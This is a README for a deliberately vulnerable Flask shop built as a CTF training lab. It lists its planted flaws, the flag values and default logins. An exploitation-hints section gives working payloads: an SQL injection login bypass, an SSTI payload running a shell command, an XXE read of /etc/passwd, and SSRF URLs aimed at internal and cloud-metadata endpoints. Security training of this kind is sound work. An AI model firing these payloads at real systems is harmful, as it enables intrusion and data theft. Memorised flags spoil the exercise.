# VulnerableShop - Deliberately Vulnerable E-commerce Application

![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.11+-green.svg)
![Flask](https://img.shields.io/badge/flask-2.3.0-orange.svg)
![Docker](https://img.shields.io/badge/docker-ready-blue.svg)
![License](https://img.shields.io/badge/license-Educational-red.svg)

## ⚠️ WARNING

**THIS APPLICATION IS DELIBERATELY INSECURE AND SHOULD NEVER BE DEPLOYED TO A PRODUCTION ENVIRONMENT OR EXPOSED TO THE PUBLIC INTERNET.**

This is an educational CTF (Capture The Flag) application designed for security training and vulnerability research in controlled environments only.

## 📋 Overview

VulnerableShop is a comprehensive, fully functional e-commerce web application built with Flask and PostgreSQL that contains **30+ intentional security vulnerabilities** for educational purposes. It features:

- **🐳 Docker Support** - One-command deployment with docker-compose
- **35+ functional pages** including complete e-commerce functionality
- **30+ vulnerability types** covering the OWASP Top 10 and beyond
- **120+ products** across 12 categories
- **20+ CTF flags** hidden throughout the application
- **Internal SSRF target service** for advanced exploitation
- **Modern, professional UI** resembling real e-commerce sites

## 🎯 Learning Objectives

- Understand common web application vulnerabilities
- Practice vulnerability identification and exploitation
- Learn pentesting methodologies and tools
- Understand the importance of secure coding practices
- Experience realistic CTF challenges

## 🚀 Quick Start with Docker (Recommended)

### Prerequisites

- Docker & Docker Compose
- 2GB RAM minimum
- 5GB disk space

### Installation

1. **Clone or navigate to the project:**
   ```bash
   cd /Users/xhzeem/vulnora
   ```

2. **Start the entire stack:**
   ```bash
   docker-compose up -d
   ```

3. **Access the application:**
   - **Main App:** http://localhost:5000
   - **Internal Service (for SSRF):** http://localhost:8080 (only from web container)

4. **View logs:**
   ```bash
   docker-compose logs -f web
   ```

5. **Stop the application:**
   ```bash
   docker-compose down
   ```

### Docker Services

- **web** - Main VulnerableShop Flask application (port 5000)
- **db** - PostgreSQL database (port 5432)
- **internal-service** - SSRF target with secrets and flags (port 8080)

## 📦 Manual Installation (Without Docker)

### Prerequisites

- Python 3.11 or higher
- PostgreSQL 15 or higher
- pip (Python package manager)

### Setup Steps

1. **Install Python dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Configure PostgreSQL:**
   
   Ensure PostgreSQL is running. Default configuration:
   - Host: `localhost`
   - Port: `5432`
   - Database: `vulnerableshop`
   - User: `postgres`
   - Password: `postgres`

3. **Initialize the database:**
   ```bash
   python init_db.py
   ```

4. **Start the application:**
   ```bash
   python app.py
   ```

   Application available at: **http://localhost:5000**

### Default Credentials

**Admin Account:**
- Username: `admin`
- Password: `admin`

**Regular Users:**
- `alice / password`
- `bob / password`
- `charlie / password`
- Plus 7 more users (david, eve, frank, grace, henry, iris, jack)

## 🔓 Comprehensive Vulnerability List (30+)

### Authentication & Session Management
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 1 | **Error-based SQL Injection** | `/login` | Easy |
| 2 | **Reflected XSS** | `/login` error message | Easy |
| 3 | **No Rate Limiting** | `/login`, `/register` | Easy |
| 4 | **Open Redirect** | `/login`, `/logout` | Medium |
| 5 | **Predictable Reset Tokens** | `/reset_password` (MD5) | Medium |
| 6 | **Username Enumeration** | `/register` | Easy |
| 7 | **Session Fixation** | Login process | Medium |
| 8 | **Session Information Disclosure** | `/debug/session` | Easy |

### Injection Vulnerabilities
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 9 | **SQL Injection (Search)** | `/products` search | Easy |
| 10 | **Blind SQL Injection** | `/product/<id>` | Medium |
| 11 | **Server-Side Template Injection (SSTI)** | `/check_stock` | Medium |
| 12 | **Client-Side Template Injection (CSTI)** | `/profile` AngularJS | Hard |
| 13 | **XXE Injection** | `/admin/import_xml` | Hard |
| 14 | **GraphQL Injection** | `/graphql` | Medium |
| 15 | **LDAP Injection** | `/admin/ldap_search` | Medium |
| 16 | **Command Injection** | `/admin/backup` | Hard |
| 17 | **HTTP Header Injection** | `/api/export` | Medium |
| 18 | **HTML Injection** | `/profile/bio` | Easy |

### Access Control
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 19 | **IDOR - Orders** | `/order/<id>` | Easy |
| 20 | **IDOR - Invoices** | `/invoice/<id>` | Easy |
| 21 | **IDOR - Messages** | `/message/<id>` | Easy |
| 22 | **IDOR - Favorites** | `/favorites/share/<user_id>` | Easy |
| 23 | **IDOR - User Edit** | `/admin/user/<id>` | Medium |
| 24 | **Mass Assignment** | `/admin/user/<id>`, `/api/profile` | Medium |

### Cross-Site Attacks
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 25 | **Stored XSS** | Product reviews | Easy |
| 26 | **Stored XSS** | Product Q&A | Easy |
| 27 | **Stored XSS** | User messages | Easy |
| 28 | **Reflected XSS** | Contact form, search | Easy |
| 29 | **XSS in Comparison** | `/compare` notes param | Easy |
| 30 | **CSRF** | `/checkout`, `/profile/change_email` | Medium |
| 31 | **Clickjacking** | All pages (no X-Frame-Options) | Easy |

### Business Logic & Application Flaws
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 32 | **Price Manipulation** | `/checkout` hidden field | Medium |
| 33 | **Price = $0 Checkout** | `/checkout/free` | Easy |
| 34 | **Negative Quantity** | `/cart/update` | Medium |
| 35 | **Race Condition** | `/apply_coupon` | Hard |

### Information Disclosure
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 36 | **Internal Cost Exposure** | `/api/products` | Easy |
| 37 | **Verbose Error Messages** | Multiple locations | Easy |
| 38 | **Directory Listing** | `/static/uploads/` | Easy |
| 39 | **Backup File Exposure** | `/.git/config`, `/.env` | Easy |
| 40 | **Session Debug Endpoint** | `/debug/session` | Medium |

### Advanced Vulnerabilities
| # | Vulnerability | Location | Difficulty |
|---|--------------|----------|------------|
| 41 | **SSRF** | `/admin/health_check` | Hard |
| 42 | **ReDoS** | `/search_advanced` | Hard |
| 43 | **CORS Misc onfiguration** | `/api/sensitive_data` | Medium |
| 44 | **Insecure Deserialization** | Session cookies | Hard |

## 🚩 CTF Flags (20+)

| Flag Location | Value | Difficulty |
|--------------|-------|------------|
| config.py | `FLAG{c0nf1g_f1l3s_4r3_s3ns1t1v3}` | Easy |
| SQL Injection Login | `FLAG{sql_1nj3ct10n_4uth_byp4ss}` | Easy |
| Blind SQLi | `FLAG{bl1nd_sql1_m4st3r}` | Medium |
| Stored XSS | `FLAG{st0r3d_xss_1s_d4ng3r0us}` | Easy |
| SSTI | `FLAG{t3mpl4t3_1nj3ct10n_pwn}` | Medium |
| IDOR Orders | `FLAG{1d0r_0rd3r_l34k4g3}` | Easy |
| CSTI AngularJS | `FLAG{cl13nt_s1d3_t3mpl4t3_1nj}` | Hard |
| Price Manipulation | `FLAG{pr1c3_m4n1pul4t10n_pr0f1t}` | Medium |
| SSRF Internal | `FLAG{ss4f_1nt3rn4l_4cc3ss}` | Hard |
| Command Injection | `FLAG{c0mm4nd_1nj3ct10n_rc3}` | Hard |
| Admin Secret | `FLAG{4dm1n_s3cr3t_k3y_f0und}` | Medium |
| Database Dump | `FLAG{d4t4b4s3_dump_succ3ss}` | Easy |
| XXE Injection | `FLAG{xx3_p4rs3r_pwn3d}` | Hard |
| GraphQL | `FLAG{gr4phql_1nj3ct10n}` | Medium |
| Free Products | `FLAG{fr33_pr0duct5_vuln}` | Easy |
| Git Config | `FLAG{g1t_c0nf1g_3xp0s3d}` | Medium |
| DotEnv File | `FLAG{d0t3nv_f1l3_3xp0s3d}` | Easy |
| Backup Files | `FLAG{b4ckup_f1l3s_l34k_cr3d3nt14ls}` | Easy |
| IDOR Messages | `FLAG{1d0r_m3ss4g3s_r34d}` | Easy |
| IDOR Favorites | `FLAG{1d0r_f4v0r1t3s_shar3d}` | Easy |
| XSS Product Q&A | `FLAG{xss_pr0duct_qu3st10ns}` | Easy |
| Session Debug | `FLAG{s3ss10n_d3bug_l34k}` | Medium |

## 💡 Exploitation Hints

### SQL Injection (Login)
```sql
Username: admin' OR '1'='1'--
Password: anything
```

### SSTI (Stock Checker)
```python
{{ config }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### XXE (XML Import)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<products>
  <product>
    <name>&xxe;</name>
    <price>99.99</price>
  </product>
</products>
```

### SSRF (Health Check)
```
http://internal-service:8080/admin/secrets
http://internal-service:8080/aws/latest/meta-data/
```

### Price = $0 Checkout
1. Add items to cart
2. Open browser dev tools (F12)
3. Find hidden input `total_amount`
4. Change value to `0.00`
5. Submit checkout form

### ReDoS (Advanced Search)
```regex
(a+)+b
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaa (without 'b')
```

## 📁 Project Structure

```
vulnora/
├── app.py                      # Main Flask application (2400+ lines)
├── config.py                   # Configuration with secrets
├── schema.sql                  # Enhanced database schema (120+ products)
├── init_db.py                  # Database initialization
├── requirements.txt            # Python dependencies
├── Dockerfile                  # Main app container
├── docker-compose.yml          # Multi-container orchestration
├── .env                        # Exposed credentials (vulnerability)
├── .env.example                # Environment variables template
├── .git/config                 # Exposed git config (vulnerability)
├── backups/                    # Exposed backup files
│   └── config.backup
├── internal-service/           # SSRF target service
│   ├── Dockerfile
│   └── internal_app.py
├── static/
│   ├── css/style.css          # Modern responsive styling
│   ├── js/app.js              # Frontend JavaScript
│   ├── images/                # Product & category images
│   └── uploads/               # User uploads (directory listing enabled)
└── templates/                  # Jinja2 templates (35+ pages)
    ├── base.html
    ├── home.html
    ├── auth/                  # Login, register, reset
    ├── products/              # Catalog, detail, Q&A, comparison
    ├── cart/                  # Cart, checkout, confirmation
    ├── user/                  # Profile, orders, messages, favorites
    ├── admin/                 # Dashboard, users, products, tools
    ├── api/                   # GraphQL interface
    └── errors/                # 404, 500
```

## 🛠️ Exploitation Tools

Recommended tools for practicing on VulnerableShop:

- **Burp Suite Community** - Web proxy and scanner
- **OWASP ZAP** - Security testing tool
- **SQLMap** - Automated SQL injection
- **curl / Postman** - API testing
- **Browser DevTools** - Built-in browser tools

## 🧹 Resetting the Environment

**Docker:**
```bash
docker-compose down -v
docker-compose up -d
```

**Manual:**
```bash
python init_db.py
```

## 🐛 Troubleshooting

### Docker Issues

**Port already in use:**
```bash
# Check what's using the port
lsof -i :5000
# Or change port in docker-compose.yml
```

**Database not ready:**
```bash
# Wait for db health check
docker-compose logs db
```

### Manual Setup Issues

**Database connection error:**
```bash
# Check PostgreSQL is running
pg_isready

# macOS
brew services start postgresql
```

**Missing dependencies:**
```bash
pip install --upgrade -r requirements.txt
```

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

## 📝 License

This project is released for **educational purposes only**. Use responsibly in isolated environments.

## 🙏 Acknowledgments

Inspired by:
- DVWA (Damn Vulnerable Web Application)
- WebGoat (OWASP)
- OWASP Juice Shop
- HackTheBox & TryHackMe

---

**Remember: With great power comes great responsibility. Use this knowledge ethically and only in authorized environments!**

🎯 **Happy Hacking!** 🎯
